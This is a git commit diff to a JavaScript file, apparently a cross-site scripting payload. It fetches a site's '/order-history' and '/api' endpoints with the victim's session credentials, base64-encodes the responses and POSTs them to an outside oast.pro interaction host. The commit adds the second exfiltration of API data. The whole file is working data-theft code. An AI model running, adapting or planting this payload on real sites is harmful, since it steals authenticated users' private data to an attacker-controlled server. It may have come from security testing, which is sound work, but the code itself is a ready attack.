6b33d1c6b3f56418ca96674afba6fcfb10418f43
Jaynel Patiarba <39252817+0xcucumbersalad@users.noreply.github.com>
2025-06-12 04:13:14 +0800

    Update script.js

--- script.js
+++ script.js
@@ -2,26 +2,28 @@ const url = "https://d14tov0gn2sl5jg9g1sgudzxavijmmgex.oast.pro";
 
 async function fetchData() {
     try {
-        // Fetch order history
         const response = await fetch('/order-history', {
             method: 'GET',
             headers: {
                 'Content-Type': 'application/json',
             },
-            credentials: 'include' // If authentication is needed
+            credentials: 'include'
         });
-
+        const response1 = await fetch('/api', {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            credentials: 'include'
+        });
         if (!response.ok) {
             throw new Error(`HTTP error! Status: ${response.status}`);
         }
-
-        // Read response as text (or .json() if JSON data)
         const textData = await response.text();
-
-        // Convert to Base64
+        const apiData = await response1.text();
+        const base64ApiData = btoa(unescape(encodeURIComponent(apiData)));
         const base64Data = btoa(unescape(encodeURIComponent(textData)));
-
-        // Send data to external URL
+        
         await fetch(url, {
             method: 'POST',
             headers: {
@@ -29,7 +31,13 @@ async function fetchData() {
             },
             body: base64Data,
         });
-
+        await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'text/plain',
+            },
+            body: base64ApiData,
+        });
         console.log('Data sent successfully');
     } catch (error) {
         console.error('Error in fetchData:', error);
